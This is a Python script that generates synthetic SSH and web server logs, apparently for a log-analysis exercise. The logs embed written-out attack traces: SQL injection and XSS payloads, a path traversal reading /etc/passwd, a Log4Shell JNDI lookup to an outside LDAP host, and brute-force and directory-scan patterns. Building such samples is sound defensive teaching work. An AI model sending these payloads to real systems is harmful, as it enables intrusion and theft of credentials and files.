"""Generate the fake log files in samples/ (run: python3 tools/generate_samples.py).

The IPs come from documentation ranges (RFC 5737), they don't belong to anyone.
"""

import random
from datetime import datetime, timedelta
from pathlib import Path

random.seed(42)
OUT = Path(__file__).resolve().parent.parent / "samples"
OUT.mkdir(exist_ok=True)
start = datetime(2026, 11, 16, 8, 0, 0)

# ---------------------------------------------------------------- auth.log
lines = []
t = start


def syslog(ts, msg):
    return f"{ts:%b %d %H:%M:%S} web01 sshd[{random.randint(1000, 9999)}]: {msg}"


# normal activity
for i in range(6):
    t += timedelta(minutes=random.randint(3, 15))
    lines.append(syslog(t, f"Accepted publickey for alice from 192.0.2.10 port {50000 + i} ssh2"))
    lines.append(f"{t:%b %d %H:%M:%S} web01 CRON[{4000 + i}]: pam_unix(cron:session): session opened for user root")

# one typo from a legit user
lines.append(syslog(t + timedelta(seconds=5), "Failed password for bob from 192.0.2.11 port 50100 ssh2"))
lines.append(syslog(t + timedelta(seconds=12), "Accepted password for bob from 192.0.2.11 port 50101 ssh2"))

# brute force from 203.0.113.45, then success = compromise
t = start + timedelta(hours=1)
for user in ["root"] * 12 + ["admin", "ubuntu", "test", "oracle", "pi", "postgres"]:
    t += timedelta(seconds=random.randint(1, 3))
    if user != "root":
        lines.append(syslog(t, f"Invalid user {user} from 203.0.113.45 port {random.randint(30000, 60000)}"))
        lines.append(syslog(t, f"Failed password for invalid user {user} from 203.0.113.45 port 41000 ssh2"))
    else:
        lines.append(syslog(t, f"Failed password for root from 203.0.113.45 port {random.randint(30000, 60000)} ssh2"))
lines.append(syslog(t + timedelta(seconds=4), "Accepted password for root from 203.0.113.45 port 41999 ssh2"))

# slower brute force from another IP
t = start + timedelta(hours=2)
for _ in range(8):
    t += timedelta(seconds=6)
    lines.append(syslog(t, "Failed password for root from 198.51.100.77 port 22222 ssh2"))

lines.sort(key=lambda l: datetime.strptime("2026 " + l[:15], "%Y %b %d %H:%M:%S"))
(OUT / "auth.log").write_text("\n".join(lines) + "\n")

# ---------------------------------------------------------------- access.log
web = []
UA_BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"


def access(ip, ts, path, status, ua=UA_BROWSER, method="GET"):
    return f'{ip} - - [{ts:%d/%b/%Y:%H:%M:%S} +0000] "{method} {path} HTTP/1.1" {status} {random.randint(200, 9000)} "-" "{ua}"'


t = start
for path in ["/", "/about", "/blog", "/blog/post-1", "/contact", "/static/style.css"]:
    t += timedelta(seconds=random.randint(5, 60))
    web.append(access("192.0.2.20", t, path, 200))

# SQL injection + XSS from 203.0.113.80 with sqlmap
t = start + timedelta(minutes=30)
for path in ["/product.php?id=1", "/product.php?id=1%27%20OR%20%271%27=%271",
             "/product.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
             "/product.php?id=1%20AND%20SLEEP(5)",
             "/search?q=%3Cscript%3Ealert(1)%3C/script%3E"]:
    t += timedelta(seconds=2)
    web.append(access("203.0.113.80", t, path, 200, ua="sqlmap/1.8.3#stable (https://sqlmap.org)"))

# directory scan with gobuster
t = start + timedelta(minutes=45)
for word in ["admin", "backup", "old", "test", "dev", "config", "uploads", "private", "db", "api",
             "phpmyadmin", "wp-admin", "login", "panel", "cgi-bin", "tmp", "logs", "data", "files", "secret",
             "staging", "beta"]:
    t += timedelta(milliseconds=800)
    web.append(access("198.51.100.23", t, f"/{word}/", 404, ua="gobuster/3.6"))
web.append(access("198.51.100.23", t, "/.env", 404, ua="gobuster/3.6"))
web.append(access("198.51.100.23", t, "/.git/config", 403, ua="gobuster/3.6"))

# path traversal + log4shell
t = start + timedelta(hours=1)
web.append(access("203.0.113.99", t, "/download?file=../../../../etc/passwd", 400))
web.append(access("203.0.113.99", t, "/?x=${jndi:ldap://203.0.113.99:1389/a}", 200))

web.sort(key=lambda l: datetime.strptime(l.split("[")[1].split()[0], "%d/%b/%Y:%H:%M:%S"))
(OUT / "access.log").write_text("\n".join(web) + "\n")
print(f"wrote {len(lines)} auth lines and {len(web)} access lines to {OUT}")
